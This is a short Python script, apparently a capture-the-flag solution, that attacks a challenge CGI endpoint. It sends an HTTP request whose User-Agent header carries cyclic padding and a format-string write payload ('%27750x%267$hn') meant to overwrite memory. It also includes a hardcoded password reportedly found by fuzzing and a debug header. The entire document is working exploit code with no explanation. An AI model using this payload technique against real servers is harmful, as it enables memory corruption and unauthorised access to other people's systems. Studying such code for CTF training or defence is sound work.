from pwn import *
import requests

url = "https://nessus-braggart.chals.io/sec.cgi"

password = "xbYP3h7Ua94c" # This was added after fuzzing 

header = {"User-Agent":cyclic(1008)+b"%27750x%267$hn","X-DEBUG":"1","X-PASSWORD":password} # 27750 -> '0x6c66' --> lf
r = requests.get(url, headers=header)
print(r.text)

